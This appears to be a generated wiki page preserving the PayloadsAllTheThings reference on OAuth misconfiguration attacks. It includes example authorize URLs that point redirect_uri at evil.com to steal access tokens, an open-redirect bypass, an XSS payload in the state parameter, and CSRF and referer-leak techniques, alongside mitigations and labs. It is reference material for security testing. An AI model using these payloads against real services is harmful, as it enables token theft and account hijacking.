---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# OAuth Misconfiguration

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-oauth-misconfiguration-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/OAuth Misconfiguration/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [OAuth Misconfiguration](../../topics/oauth-misconfiguration/oauth-misconfiguration.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-oauth-misconfiguration-readme |
| name | OAuth Misconfiguration |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md |

## Preserved Source Material

````yaml
_body: "# OAuth Misconfiguration\n\n> OAuth is a widely-used authorization framework that allows third-party applications\
  \ to access user data without exposing user credentials. However, improper configuration and implementation of OAuth can\
  \ lead to severe security vulnerabilities. This document explores common OAuth misconfigurations, potential attack vectors,\
  \ and best practices for mitigating these risks.\n\n## Summary\n\n- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)\n\
  - [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect_uri)\n- [Executing XSS via redirect_uri](#executing-xss-via-redirect_uri)\n\
  - [OAuth Private Key Disclosure](#oauth-private-key-disclosure)\n- [Authorization Code Rule Violation](#authorization-code-rule-violation)\n\
  - [Cross-Site Request Forgery](#cross-site-request-forgery)\n- [Labs](#labs)\n- [References](#references)\n\n## Stealing\
  \ OAuth Token via referer\n\n> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the\
  \ site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login\
  \ to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)\n\n## Grabbing\
  \ OAuth Token via redirect_uri\n\nRedirect to a controlled domain to get the access token\n\n```powershell\nhttps://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful\n\
  https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com\n```\n\nRedirect to an accepted Open\
  \ URL in to get the access token\n\n```powershell\nhttps://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com\n\
  https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F\n```\n\nOAuth\
  \ implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open\
  \ Redirect.\n\nSometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:\n\n```powershell\n\
  https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com\n```\n\n## Executing XSS via redirect_uri\n\
  \n```powershell\nhttps://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>\n\
  ```\n\n## OAuth Private Key Disclosure\n\nSome Android/iOS app can be decompiled and the OAuth Private key can be accessed.\n\
  \n## Authorization Code Rule Violation\n\n> The client MUST NOT use the authorization code  more than once.  \n\nIf an authorization\
  \ code is used more than once, the authorization server MUST deny the request\nand SHOULD revoke (when possible) all tokens\
  \ previously issued based on that authorization code.\n\n## Cross-Site Request Forgery\n\nApplications that do not check\
  \ for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and\
  \ intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.\n\
  \n> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request\
  \ sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state.\
  \ The client SHOULD utilize the \"state\" request parameter to deliver this value to the authorization server when making\
  \ an authorization request.\n\n## Labs\n\n- [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)\n\
  - [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)\n\
  - [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)\n\
  - [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)\n\
  - [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)\n\
  \n## References\n\n- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](https://web.archive.org/web/20161130191804/http://blog.intothesymmetry.com:80/2016/11/all-your-paypal-tokens-belong-to-me.html)\n\
  - [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](https://web.archive.org/web/20140411210456/http://intothesymmetry.blogspot.ch:80/2014/04/oauth-2-how-i-have-hacked-facebook.html)\n\
  - [How I hacked Github again - Egor Homakov - February 7, 2014](https://web.archive.org/web/20140302195803/http://homakov.blogspot.ch:80/2014/02/how-i-hacked-github-again.html)\n\
  - [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](https://web.archive.org/web/20151221013410/http://andrisatteka.blogspot.ch:80/2014/09/how-microsoft-is-giving-your-data-to.html)\n\
  - [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://web.archive.org/web/20250113205505/https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)"
_relative_path: OAuth Misconfiguration/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/OAuth Misconfiguration/README.md
````
